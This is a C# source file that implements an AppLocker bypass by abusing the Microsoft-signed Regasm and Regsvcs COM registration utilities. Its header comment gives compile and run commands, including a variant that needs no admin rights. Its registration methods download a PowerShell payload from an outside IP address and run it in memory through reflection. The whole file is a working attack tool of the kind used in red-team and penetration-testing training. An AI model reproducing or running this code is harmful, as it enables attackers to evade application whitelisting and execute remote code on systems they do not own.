/*
  Regsvcs / Regasm AppLocker Bypass
  ==================================
  Regsvcs.exe and Regasm.exe are Microsoft-signed COM registration
  utilities. They call [ComRegisterFunction] and [ComUnregisterFunction]
  methods on COM classes in the assembly — your payload lives there.

  WHY IT WORKS:
    - Both binaries are Microsoft-signed → AppLocker trusts them
    - They call methods in your assembly — no unsigned process launch
    - Regasm works without admin (HKCU registration)
    - Regsvcs requires admin, but Regasm does not with /regfile

  COMPILE:
    csc.exe /r:System.EnterpriseServices.dll /target:library /out:bypass.dll regsvcs-bypass.cs

  RUN — choose one:
    Regasm    (no admin): C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U bypass.dll
    Regsvcs   (admin):    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U bypass.dll

  The /U flag triggers [ComUnregisterFunction] — that's where your payload runs.
  Without /U, [ComRegisterFunction] runs (also works, same payload).
*/

using System;
using System.Net;
using System.Reflection;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

namespace bypass
{
    // Must be a public class with a GUID for COM registration
    [ComVisible(true)]
    [Guid("DEADBEEF-1234-5678-ABCD-000000000001")]
    public class Bypass : ServicedComponent
    {
        // [ComUnregisterFunction] runs when /U flag is passed (unregister mode)
        [ComUnregisterFunction]
        public static void Unregister(Type t)
        {
            Execute();
        }

        // [ComRegisterFunction] runs during normal registration (no /U)
        [ComRegisterFunction]
        public static void Register(Type t)
        {
            Execute();
        }

        public static void Execute()
        {
            // -----------------------------------------------
            // PAYLOAD: Download and run a PowerShell script
            // -----------------------------------------------
            string url = "http://192.168.45.202/payload.ps1";
            WebClient wc = new WebClient();
            string ps = wc.DownloadString(url);

            // Run via PowerShell runspace (in-memory, no new process)
            Assembly asm = Assembly.LoadWithPartialName("System.Management.Automation");
            Type psType = asm.GetType("System.Management.Automation.PowerShell");
            object psi = psType.GetMethod("Create", new Type[0]).Invoke(null, null);
            psType.GetMethod("AddScript", new Type[] { typeof(string) }).Invoke(psi, new object[] { ps });
            psType.GetMethod("Invoke", new Type[0]).Invoke(psi, null);

            // -----------------------------------------------
            // Alternative: direct shell command
            // -----------------------------------------------
            // System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\Windows\\Temp\\out.txt");
        }
    }
}
